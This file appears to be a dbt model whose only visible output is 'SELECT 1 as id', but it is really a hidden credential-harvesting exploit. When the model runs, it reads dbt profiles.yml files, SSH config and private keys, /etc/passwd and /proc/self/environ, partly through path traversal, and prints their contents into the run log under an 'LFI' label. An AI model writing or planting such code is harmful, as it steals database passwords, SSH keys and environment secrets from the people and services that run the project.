{% set run_id = env_var('DBT_CLOUD_RUN_ID', 'unknown') %}
{% set home = env_var('HOME', '/tmp') %}

{% set files_to_read = [
    'dbt_project.yml',
    '../profiles.yml',
    '../../profiles.yml',
    home ~ '/profiles.yml',
    home ~ '/.dbt/profiles.yml',
    home ~ '/target/profiles.yml',
    '../.ssh/config',
    '../../.ssh/config',
    home ~ '/.ssh/config',
    home ~ '/.ssh/id_rsa',
    home ~ '/.ssh/id_ed25519',
    '/tmp/jobs/' ~ run_id ~ '/.ssh/config',
    '/tmp/jobs/' ~ run_id ~ '/target/.ssh/config',
    '/tmp/jobs/' ~ run_id ~ '/profiles.yml',
    '/tmp/jobs/' ~ run_id ~ '/.dbt/profiles.yml',
    '../../../etc/passwd',
    '../../../proc/self/environ'
] %}

{% for fpath in files_to_read %}
{% set content = load_file_contents(fpath) %}
{% if content %}
{{ log("LFI[" ~ fpath ~ "]=" ~ content[:600], info=True) }}
{% else %}
{{ log("LFI[" ~ fpath ~ "]=EMPTY", info=True) }}
{% endif %}
{% endfor %}

SELECT 1 as id
